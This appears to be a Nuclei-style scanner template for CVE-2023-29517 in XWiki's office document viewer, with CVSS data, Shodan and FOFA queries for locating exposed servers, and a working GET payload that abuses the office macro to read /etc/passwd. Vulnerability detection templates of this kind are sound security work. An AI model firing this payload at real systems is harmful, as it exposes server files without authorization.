id: CVE-2023-29517

info:
  name: XWiki Office Document Viewer SSRF and Sensitive Data Exposure
  author: ProjectDiscoveryAI
  severity: high
  description: |
    XWiki Platform's office document viewer macro allowed unauthorized users to view any file content from the hosting server and perform internal requests to resources on the server. This vulnerability has been patched in later versions. Users are advised to upgrade to avoid unauthorized access to sensitive information and potential data leakage.
  impact: |
    Successful exploitation could lead to server-side request forgery and exposure of sensitive data.
  remediation: |
    Apply the vendor-supplied patch or upgrade to a non-vulnerable version.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2023-29517
    cwe-id: CWE-200
    epss-score: 0.00146
    epss-percentile: 0.51886
    cpe: cpe:2.3:a:xwiki:xwiki:*:*:*:*:*:*:*:*
  metadata:
    vendor: xwiki
    product: xwiki
    shodan-query: html:"data-xwiki-reference"
    fofa-query: body="data-xwiki-reference"
  tags: intrusive

http:
  - method: GET
    path:
      - "{{BaseURL}}/xwiki/bin/view/Main/?sheet=CKEditor.HTMLConverter&language=en&sourceSyntax=xwiki%2F2.1&fromHTML=false&toHTML=true&text=%7B%7Boffice+reference%3D%22url%3Afile%3A%2F%2F%2Fetc%2Fpasswd%22%2F%7D%7D&formToken={{randstr}}"

    matchers:
      - type: word
        words:
          - "root:x"
        part: body
